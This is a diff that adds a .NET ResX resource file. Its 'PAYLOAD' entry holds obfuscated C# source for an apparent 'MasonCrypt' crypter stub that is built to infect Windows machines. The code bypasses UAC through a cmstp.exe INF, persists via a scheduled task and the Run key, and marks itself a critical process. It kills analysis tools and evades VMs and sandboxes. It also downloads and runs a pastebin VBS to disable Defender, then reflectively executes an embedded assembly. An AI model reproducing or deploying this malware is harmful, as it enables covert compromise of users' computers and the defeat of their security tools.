@@ -1,0 +1,584 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <!-- 
+    Microsoft ResX Schema 
+    
+    Version 2.0
+    
+    The primary goals of this format is to allow a simple XML format 
+    that is mostly human readable. The generation and parsing of the 
+    various data types are done through the TypeConverter classes 
+    associated with the data types.
+    
+    Example:
+    
+    ... ado.net/XML headers & schema ...
+    <resheader name="resmimetype">text/microsoft-resx</resheader>
+    <resheader name="version">2.0</resheader>
+    <resheader name="reader">System.Resources.ResXResourceReader, System.Windows.Forms, ...</resheader>
+    <resheader name="writer">System.Resources.ResXResourceWriter, System.Windows.Forms, ...</resheader>
+    <data name="Name1"><value>this is my long string</value><comment>this is a comment</comment></data>
+    <data name="Color1" type="System.Drawing.Color, System.Drawing">Blue</data>
+    <data name="Bitmap1" mimetype="application/x-microsoft.net.object.binary.base64">
+        <value>[base64 mime encoded serialized .NET Framework object]</value>
+    </data>
+    <data name="Icon1" type="System.Drawing.Icon, System.Drawing" mimetype="application/x-microsoft.net.object.bytearray.base64">
+        <value>[base64 mime encoded string representing a byte array form of the .NET Framework object]</value>
+        <comment>This is a comment</comment>
+    </data>
+                
+    There are any number of "resheader" rows that contain simple 
+    name/value pairs.
+    
+    Each data row contains a name, and value. The row also contains a 
+    type or mimetype. Type corresponds to a .NET class that support 
+    text/value conversion through the TypeConverter architecture. 
+    Classes that don't support this are serialized and stored with the 
+    mimetype set.
+    
+    The mimetype is used for serialized objects, and tells the 
+    ResXResourceReader how to depersist the object. This is currently not 
+    extensible. For a given mimetype the value must be set accordingly:
+    
+    Note - application/x-microsoft.net.object.binary.base64 is the format 
+    that the ResXResourceWriter will generate, however the reader can 
+    read any of the formats listed below.
+    
+    mimetype: application/x-microsoft.net.object.binary.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Binary.BinaryFormatter
+            : and then encoded with base64 encoding.
+    
+    mimetype: application/x-microsoft.net.object.soap.base64
+    value   : The object must be serialized with 
+            : System.Runtime.Serialization.Formatters.Soap.SoapFormatter
+            : and then encoded with base64 encoding.
+
+    mimetype: application/x-microsoft.net.object.bytearray.base64
+    value   : The object must be serialized into a byte array 
+            : using a System.ComponentModel.TypeConverter
+            : and then encoded with base64 encoding.
+    -->
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:import namespace="http://www.w3.org/XML/1998/namespace" />
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="metadata">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" />
+              </xsd:sequence>
+              <xsd:attribute name="name" use="required" type="xsd:string" />
+              <xsd:attribute name="type" type="xsd:string" />
+              <xsd:attribute name="mimetype" type="xsd:string" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="assembly">
+            <xsd:complexType>
+              <xsd:attribute name="alias" type="xsd:string" />
+              <xsd:attribute name="name" type="xsd:string" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+              <xsd:attribute ref="xml:space" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+  <resheader name="resmimetype">
+    <value>text/microsoft-resx</value>
+  </resheader>
+  <resheader name="version">
+    <value>2.0</value>
+  </resheader>
+  <resheader name="reader">
+    <value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <resheader name="writer">
+    <value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value>
+  </resheader>
+  <data name="PAYLOAD" xml:space="preserve">
+    <value>using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.IO;
+using System.Management;
+using System.Net;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Security.Principal;
+using System.Text;
+using System.Threading;
+using System.Windows.Forms;
+using Microsoft.Win32;
+
+
+public class Startup
+{
+    public static void 乒仭丧亹佐伄亖享乥什么仁丏业乻伎位令仙丹伆仇不亸仠仕仟()
+    {
+        丑乎事乧他丂世伹乌乭佻乴佇丶伞乎久伢仉佭佬伅伬(伩佩乒亾仭乻並伃之佔伽仩仺丛互乗佹个 + ".exe");
+        if (!伮伷佝伾么下仄佧乇乹仛伏乌伤了丿佛仉二佃一(佉丝仔仦乬乔仑伙仛书乧乹丄丽丞丈佪二业佗亏仓佥))
+        {
+            丠丹佖亴佬仛主乒仢仢乲丰伪亗佫丞仼从仕伹之伧乆伽乏乵乎佶丑亏仨于令丽乔仸代云佮伂佸(佉丝仔仦乬乔仑伙仛书乧乹丄丽丞丈佪二业佗亏仓佥);
+            仱伆伞亁亸佟伓丑伤仠伹();
+        }
+
+
+    }
+    private static string 伩佩乒亾仭乻並伃之佔伽仩仺丛互乗佹个 = "startupnamexd";
+    private static string 佉丝仔仦乬乔仑伙仛书乧乹丄丽丞丈佪二业佗亏仓佥 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + 伩佩乒亾仭乻並伃之佔伽仩仺丛互乗佹个 + ".exe";
+    private static string 仜个亿乀丟伅仡乍亦价仱佒伨伀了佭丂伣佉伏佅 = 伩佩乒亾仭乻並伃之佔伽仩仺丛互乗佹个;
+    private static string 亦佮亦乸亇且伙乐万且丘业伣丩丈亟佻亓他伒亍 = 佉丝仔仦乬乔仑伙仛书乧乹丄丽丞丈佪二业佗亏仓佥;
+
+    private static readonly string 众仒云伫丗乨京伝 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), 仜个亿乀丟伅仡乍亦价仱佒伨伀了佭丂伣佉伏佅 + ".txt");
+
+    public static void 仱伆伞亁亸佟伓丑伤仠伹()
+    {
+        if (!佝举丄乵佂传亪伯佼伙丶们丌乫乁仗仵佣仛亇仢以乕也佌丆乎人(仜个亿乀丟伅仡乍亦价仱佒伨伀了佭丂伣佉伏佅) &amp;&amp; !File.Exists(众仒云伫丗乨京伝))
+        {
+            string arguments = "/Create /SC ONLOGON /TN " + 仜个亿乀丟伅仡乍亦价仱佒伨伀了佭丂伣佉伏佅 + " /TR " + 亦佮亦乸亇且伙乐万且丘业伣丩丈亟佻亓他伒亍 + " /RU INTERACTIVE /RL HIGHEST /F";
+
+            ProcessStartInfo psi = new ProcessStartInfo
+            {
+                FileName = "schtasks.exe",
+                Arguments = arguments,
+                CreateNoWindow = true,
+                UseShellExecute = false,
+                RedirectStandardError = true,
+                RedirectStandardOutput = true
+            };
+
+            Process process = new Process { StartInfo = psi };
+
+            try
+            {
+                process.Start();
+                process.WaitForExit();
+
+                if (process.ExitCode == 0)
+                {
+                    CreateMarkerFile();
+                }
+                else
+                {
+                }
+            }
+            catch (Exception ex)
+            {
+            }
+        }
+        else
+        {
+        }
+    }
+    public static void 丑乎事乧他丂世伹乌乭佻乴佇丶伞乎久伢仉佭佬伅伬(string customName)
+    {
+        string 亹乮亓义伎伀仳亰佨个伻优佹 = Assembly.GetExecutingAssembly().Location;
+        string 佛伕仚仙万仄休佌伌亊乕三亠价互併伞伉乓佱伶 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+        string 亜仇九丝伊佴仸佐你佀亰佅佌伉亖仠今乥仴丱 = Path.Combine(佛伕仚仙万仄休佌伌亊乕三亠价互併伞伉乓佱伶, customName);
+
+        if (!File.Exists(亜仇九丝伊佴仸佐你佀亰佅佌伉亖仠今乥仴丱))
+        {
+            try
+            {
+                File.Copy(亹乮亓义伎伀仳亰佨个伻优佹, 亜仇九丝伊佴仸佐你佀亰佅佌伉亖仠今乥仴丱);
+            }
+            catch (Exception ex)
+            {
+            }
+        }
+        else
+        {
+        }
+    }
+    private static bool 佝举丄乵佂传亪伯佼伙丶们丌乫乁仗仵佣仛亇仢以乕也佌丆乎人(string taskName)
+    {
+        string arguments = "/Query /TN " + taskName;
+
+        ProcessStartInfo psi = new ProcessStartInfo
+        {
+            FileName = "schtasks.exe",
+            Arguments = arguments,
+            CreateNoWindow = true,
+            UseShellExecute = false,
+            RedirectStandardError = true,
+            RedirectStandardOutput = true
+        };
+
+        Process process = new Process { StartInfo = psi };
+        process.Start();
+        process.WaitForExit();
+
+        return process.ExitCode == 0;
+    }
+
+    private static void CreateMarkerFile()
+    {
+        File.Create(众仒云伫丗乨京伝).Close();
+    }
+    public static bool 伮伷佝伾么下仄佧乇乹仛伏乌伤了丿佛仉二佃一(string filePath)
+    {
+        string fileName = Path.GetFileName(filePath);
+        string startupRegistryPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+
+        using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(startupRegistryPath))
+        {
+            if (registryKey != null)
+            {
+                foreach (string valueName in registryKey.GetValueNames())
+                {
+                    string valueData = registryKey.GetValue(valueName).ToString();
+                    if (valueData.Equals(filePath, StringComparison.OrdinalIgnoreCase) ||
+                        valueData.EndsWith(fileName, StringComparison.OrdinalIgnoreCase))
+                    {
+                        return true;
+                    }
+                }
+            }
+        }
+
+        return false;
+    }
+    public static void 丠丹佖亴佬仛主乒仢仢乲丰伪亗佫丞仼从仕伹之伧乆伽乏乵乎佶丑亏仨于令丽乔仸代云佮伂佸(string filePath)
+    {
+        string fileName = Path.GetFileName(filePath);
+        string startupRegistryPath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+
+        using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(startupRegistryPath, true))
+        {
+            if (registryKey != null &amp;&amp; !伮伷佝伾么下仄佧乇乹仛伏乌伤了丿佛仉二佃一(filePath))
+            {
+                registryKey.SetValue(fileName, filePath);
+            }
+            else
+            {
+            }
+        }
+    }
+
+    public static class NativeMethods
+    {
+        [DllImport("user32.dll")]
+        public static extern IntPtr GetForegroundWindow();
+
+        [DllImport("user32.dll")]
+        public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        public static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern EXECUTION_STATE SetThreadExecutionState(EXECUTION_STATE esFlags);
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        public static extern void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);
+
+        public enum EXECUTION_STATE : uint
+        {
+            ES_CONTINUOUS = 0x80000000,
+            ES_DISPLAY_REQUIRED = 0x00000002,
+            ES_SYSTEM_REQUIRED = 0x00000001
+        }
+    }
+
+    public class Program
+    {
+        private static string GenerateRandomString(int length)
+        {
+            StringBuilder result = new StringBuilder(length);
+            for (int i = 0; i &lt; length; i++)
+            {
+                result.Append(allowedChars[random.Next(allowedChars.Length)]);
+            }
+            return result.ToString();
+        }
+        private static string 良好可在可个的一型可一以型看你类看眉的看好在型在到眉眉眉可看 = "masonecrypto";
+        private static byte[] 以型看你类看眉的看好在型在到眉眉眉可 = Convert.FromBase64String(型看你类看眉的看好在型在到眉(良好可在可个的一型可一以型看你类看眉的看好在型在到眉眉眉可看));
+
+        public static void Main(string[] args)
+        {
+            Dictionary&lt;string, bool&gt; data = new Dictionary&lt;string, bool&gt;
+        {
+            { "WDdis", bool.Parse("disableWD") },
+            { "UAC",  bool.Parse("bypassUAC")},
+            { "antidebug",  bool.Parse("enantidbg")},
+            { "startup",  bool.Parse("addtostartup")},
+            { "antikill",  bool.Parse("nokill")},
+        };
+            if (data["UAC"])
+            {
+                if (!IsUserAnAdmin())
+                {
+                    try
+                    {
+                        string tempFile = Assembly.GetExecutingAssembly().Location;
+                        StringBuilder InfFile = new StringBuilder();
+                        InfFile.Append(SetInfFile("cmd /c start \"" + tempFile + "\""));
+                        ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
+                        startInfo.Arguments = "/au " + InfFile.ToString();
+                        startInfo.UseShellExecute = false;
+                        startInfo.CreateNoWindow = true;
+                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                        Process.Start(startInfo);
+                        IntPtr windowHandle = IntPtr.Zero;
+                        do
+                        {
+                            windowHandle = SetWindowActive("cmstp");
+                        } while (windowHandle == IntPtr.Zero);
+                        System.Windows.Forms.SendKeys.SendWait("{ENTER}");
+                    }
+                    catch { }
+                    Environment.Exit(0);
+                }
+            }
+            if (data["startup"])
+            {
+                Startup.乒仭丧亹佐伄亖享乥什么仁丏业乻伎位令仙丹伆仇不亸仠仕仟();
+            }
+            if (data["antikill"])
+            {
+                Set();
+            }
+
+            if (data["antidebug"])
+            {
+                if (!anyrun())
+                {
+                    new Thread(() =&gt;
+                    {
+                        RunAntiAnalysis();
+                    }).Start();
+                }
+                else { Environment.Exit(0); }
+            }
+
+            if (data["WDdis"])
+            {
+                string content = new WebClient().DownloadString("https://pastebin.com/raw/UrQdce5Y");
+                string tempFilePath = Path.Combine(Path.GetTempPath(), GenerateRandomString(10) + ".vbs");
+                File.WriteAllText(tempFilePath, content);
+                Process.Start(tempFilePath);
+
+            }
+            Assembly 良好可在可个的一型可一以型看你类看眉的看好在型在到眉眉眉可看 = Assembly.Load(Program.以型看你类看眉的看好在型在到眉眉眉可);
+            string 眉的看好可在在型在 = "masoncryptrt";
+            int 可在可型看你的看好个的一类看眉型可 = int.Parse(眉的看好可在在型在);
+            Thread.Sleep(可在可型看你的看好个的一类看眉型可);
+
+            try
+            {
+                MethodInfo 在可个的一型看你类可一以型看眉 = 良好可在可个的一型可一以型看你类看眉的看好在型在到眉眉眉可看.EntryPoint;
+                object 个的一型在型一以看你类可可 = 在可个的一型看你类可一以型看眉.Invoke(null, null);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show("Error occurred: " + ex.Message);
+            }
+        }
+
+        public static string 型看你类看眉的看好在型在到眉(string 良好可在可个的)
+        {
+            良好可在可个的 = 良好可在可个的.Replace("あ", "A").Replace("国", "v").Replace("日", "T").Replace("本", "M");
+            return 良好可在可个的;
+        }
+
+
+
+        public static string InfData = @"[version]
+Signature=$chicago$
+AdvancedINF=2.5
+
+[DefaultInstall]
+CustomDestination=CustInstDestSectionAllUsers
+RunPreSetupCommands=RunPreSetupCommandsSection
+
+[RunPreSetupCommandsSection]
+; Commands Here will be run Before Setup Begins to install
+REPLACE_COMMAND_LINE
+taskkill /IM cmstp.exe /F
+
+[CustInstDestSectionAllUsers]
+49000,49001=AllUSer_LDIDSection, 7
+
+[AllUSer_LDIDSection]
+""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"
+
+[Strings]
+ServiceName=""MasonCrypt""
+ShortSvcName=""MasonCrypt""
+
+";
+
+        [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
+        public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";
+
+        public static IntPtr SetWindowActive(string ProcessName)
+        {
+            Process[] target = Process.GetProcessesByName(ProcessName);
+            if (target.Length == 0) return IntPtr.Zero;
+            target[0].Refresh();
+            IntPtr WindowHandle = target[0].MainWindowHandle;
+            if (WindowHandle == IntPtr.Zero) return IntPtr.Zero;
+            SetForegroundWindow(WindowHandle);
+            ShowWindow(WindowHandle, 5);
+            return WindowHandle;
+        }
+
+        public static string SetInfFile(string CommandToExecute)
+        {
+            string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
+            string TemporaryDir = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\\temp";
+            StringBuilder OutputFile = new StringBuilder();
+            OutputFile.Append(TemporaryDir);
+            OutputFile.Append("\\");
+            OutputFile.Append(RandomFileName);
+            OutputFile.Append(".inf");
+            StringBuilder newInfData = new StringBuilder(InfData);
+            newInfData.Replace("REPLACE_COMMAND_LINE", CommandToExecute);
+            File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
+            return OutputFile.ToString();
+        }
+        static bool IsUserAnAdmin()
+        {
+            WindowsIdentity identity = WindowsIdentity.GetCurrent();
+            WindowsPrincipal principal = new WindowsPrincipal(identity);
+            return principal.IsInRole(WindowsBuiltInRole.Administrator);
+        }
+        private static bool anyrun()
+        {
+            try
+            {
+                string text = new WebClient().DownloadString("http://ip-api.com/line/?fields=hosting");
+                return text.Contains("true");
+            }
+            catch (Exception ex)
+            {
+            }
+            return false;
+        }
+        public static void RunAntiAnalysis()
+        {
+            if (DetectVirtualMachine() || DetectDebugger() || DetectSandboxie())
+                Environment.FailFast(null);
+
+            while (true)
+            {
+                DetectProcess();
+                Thread.Sleep(10);
+            }
+        }
+        private static bool DetectVirtualMachine()
+        {
+            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
+            {
+                using (var items = searcher.Get())
+                {
+                    foreach (var item in items)
+                    {
+                        string manufacturer = item["Manufacturer"].ToString().ToLower();
+                        if ((manufacturer == "microsoft corporation" &amp;&amp; item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
+                            || manufacturer.Contains("vmware")
+                            || item["Model"].ToString() == "VirtualBox")
+                        {
+                            return true;
+                        }
+                    }
+                }
+            }
+            return false;
+        }
+        private static bool DetectDebugger()
+        {
+            bool isDebuggerPresent = false;
+            CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
+            return isDebuggerPresent;
+        }
+        private static bool DetectSandboxie()
+        {
+            if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
+                return true;
+            else
+                return false;
+        }
+        private static void DetectProcess()
+        {
+            foreach (Process process in Process.GetProcesses())
+            {
+                try
+                {
+                    if (ProcessName.Contains(process.ProcessName))
+                        process.Kill();
+                }
+                catch { }
+            }
+        }
+        private readonly static List&lt;string&gt; ProcessName = new List&lt;string&gt; { "ProcessHacker", "taskmgr", "http toolkit", "httpdebuggerui", "wireshark", "fiddler", "charles", "regedit", "cmd", "taskmgr", "vboxservice", "df5serv", "processhacker", "vboxtray", "vmtoolsd", "vmwaretray", "ida64", "ollydbg", "pestudio", "vmwareuser", "vgauthservice", "vmacthlp", "x96dbg", "vmsrvc", "x32dbg", "vmusrvc", "prl_cc", "prl_tools", "qemu-ga", "joeboxcontrol", "ksdumperclient", "ksdumper", "joeboxserver", "xenservice", };
+
+        [DllImport("kernel32.dll")]
+        public static extern IntPtr GetModuleHandle(string lpModuleName);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
+        public static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
+        {
+            if (Convert.ToBoolean("false") &amp;&amp; IsUserAnAdmin())
+                Exit();
+        }
+        public static void Set()
+        {
+            try
+            {
+                SystemEvents.SessionEnding += new SessionEndingEventHandler(SystemEvents_SessionEnding);
+                Process.EnterDebugMode();
+                NativeMethods.RtlSetProcessIsCritical(1, 0, 0);
+            }
+            catch { }
+        }
+        public static void Exit()
+        {
+            try
+            {
+                NativeMethods.RtlSetProcessIsCritical(0, 0, 0);
+            }
+            catch
+            {
+                while (true)
+                {
+                    Thread.Sleep(100000);
+                }
+            }
+        }
+        private static readonly Random random = new Random();
+        private const string allowedChars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+
+
+
+    }
+}</value>
+  </data>
+</root>
